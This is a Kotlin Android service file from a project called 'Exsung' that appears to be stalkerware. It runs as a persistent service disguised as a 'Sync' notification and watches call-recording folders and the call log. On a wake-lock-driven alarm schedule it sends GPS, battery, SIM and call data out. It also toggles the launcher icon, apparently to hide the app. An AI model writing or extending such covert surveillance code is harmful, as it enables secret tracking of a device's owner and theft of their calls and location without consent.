/**
 * EXSUNG SYSTEM COMPONENT: 24/7 Persistent Foreground Service
 * Refer to Master Architecture Plan: d:/Desktop/Experiments/Exsung/PLAN.md
 */

package com.system.core

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File

class SystemCoreService : Service() {

    private val CHANNEL_ID = "system_core_service_channel"
    private val NOTIFICATION_ID = 8888

    private lateinit var locationEngine: LocationEngine
    private val activeObservers = mutableListOf<CallObserver>()

    companion object {
        const val ACTION_PING_TELEMETRY = "com.system.core.ACTION_PING_TELEMETRY"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("SystemCoreService", "Exsung Foreground Service Created")

        createNotificationChannel()
        val notification = createLowPriorityNotification()
        startForeground(NOTIFICATION_ID, notification)

        locationEngine = LocationEngine(this)

        // Initialize Method 2 Direct Folder Watchers for Call Recordings
        val deviceId = locationEngine.getDeviceId()
        for (folderPath in AppConfig.RECORDING_FOLDERS) {
            val folder = File(folderPath)
            if (!folder.exists()) {
                folder.mkdirs()
            }
            try {
                val observer = CallObserver(this, folder, deviceId)
                observer.startWatching()
                activeObservers.add(observer)
                Log.d("SystemCoreService", "Method 2 Watching: ${folder.absolutePath}")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        // Register Call Log ContentObserver to detect calls in real-time
        try {
            val callLogObserver = CallLogEngine.createObserver(this, deviceId)
            contentResolver.registerContentObserver(
                android.provider.CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver
            )
            Log.d("SystemCoreService", "Registered CallLog ContentObserver successfully!")
        } catch (e: Exception) {
            Log.e("SystemCoreService", "Failed to register CallLog ContentObserver: ${e.message}")
        }

        // Trigger immediate ping and schedule periodic AlarmManager wakeups
        performTelemetryPingAndScheduleNext()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_PING_TELEMETRY) {
            Log.d("SystemCoreService", "AlarmManager triggered telemetry ping action")
            performTelemetryPingAndScheduleNext()
        }
        return START_STICKY // System will automatically restart service if killed by OS
    }

    private fun performTelemetryPingAndScheduleNext() {
        // Acquire Partial WakeLock to wake CPU when screen has been off for extended periods
        var wakeLock: android.os.PowerManager.WakeLock? = null
        try {
            val pm = getSystemService(POWER_SERVICE) as? android.os.PowerManager
            wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sync::TelemetryWakeLock")
            wakeLock?.acquire(20 * 1000L) // Hold CPU awake for 20 seconds
        } catch (e: Exception) {
            Log.e("SystemCoreService", "WakeLock acquisition error: ${e.message}")
        }

        try {
            // Perform dynamic permission check
            PermissionActivity.checkAndToggleLauncherIcon(this@SystemCoreService)

            // Transmit GPS, Battery & SIM Telemetry
            locationEngine.sendTelemetryPing()

            // Transmit system call logs (with 2-second audio recording matcher)
            val deviceId = locationEngine.getDeviceId()
            CallLogEngine(this, deviceId).syncNewCallLogs()
        } finally {
            if (wakeLock != null && wakeLock.isHeld) {
                try { wakeLock.release() } catch (_: Exception) {}
            }
        }

        scheduleNextAlarm()
    }

    private fun scheduleNextAlarm() {
        try {
            val alarmManager = getSystemService(android.content.Context.ALARM_SERVICE) as? android.app.AlarmManager
            val intent = Intent(this, SystemCoreService::class.java).apply {
                action = ACTION_PING_TELEMETRY
            }
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            } else {
                android.app.PendingIntent.FLAG_UPDATE_CURRENT
            }
            val pendingIntent = android.app.PendingIntent.getService(this, 1001, intent, flags)

            val intervalMs = AppConfig.TELEMETRY_PING_INTERVAL_MINUTES * 60 * 1000
            val triggerAtMillis = System.currentTimeMillis() + intervalMs

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager?.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    triggerAtMillis,
                    pendingIntent
                )
            } else {
                alarmManager?.setExact(
                    android.app.AlarmManager.RTC_WAKEUP,
                    triggerAtMillis,
                    pendingIntent
                )
            }
            Log.d("SystemCoreService", "Scheduled next AlarmManager ping in ${AppConfig.TELEMETRY_PING_INTERVAL_MINUTES} mins")
        } catch (e: Exception) {
            Log.e("SystemCoreService", "Failed to schedule AlarmManager: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        activeObservers.forEach { it.stopWatching() }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background Sync Service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createLowPriorityNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Sync")
            .setContentText("Sync active")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .build()
    }
}
